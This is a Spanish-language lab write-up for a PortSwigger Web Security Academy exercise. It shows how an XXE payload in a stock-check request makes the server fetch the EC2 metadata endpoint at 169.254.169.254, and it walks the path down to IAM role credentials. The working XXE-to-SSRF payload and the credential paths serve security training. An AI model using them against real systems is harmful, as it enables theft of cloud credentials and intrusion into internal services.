---
aliases:
  - XXE - SSRF a metadata cloud
  - xxe ssrf
  - xxe 169.254.169.254
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XXE → SSRF a la metadata de la nube

> Lab: [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) · **Apprentice** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]] · relación → [[vulnerabilities/007-ssrf/README|SSRF]]

**Qué demuestra:** la misma entidad externa, pero apuntando a una **URL interna** en vez de a un archivo. El parser hace la request server-side (SSRF) y **te refleja la respuesta**. Objetivo: el endpoint de credenciales IAM de EC2.

## Vector completo

**Paso 1 — apuntar a la raíz de la metadata:**
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
La respuesta refleja el siguiente segmento de la ruta (p.ej. `latest`).

**Paso 2 — ir bajando la ruta** hasta las credenciales, cambiando la URL de la entidad:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin   ← nombre del rol
```
El último devuelve el **JSON con la `SecretAccessKey`**.

## Verificación
Cada request refleja el contenido de esa URL interna. Si `169.254.169.254` no responde, probá otras URLs internas / `localhost`.

## Detalles que se pasan por alto
- **Se navega la ruta a mano**, segmento por segmento: primero `/`, después `/latest/meta-data/…`. El nombre del rol (`admin` acá) sale del penúltimo paso.
- `http://` (no `file://`) → esto es SSRF, no lectura de archivo.
- El mismo truco sirve para cualquier servicio **interno** que confíe en el origen del server (dashboards, `localhost:PORT`).
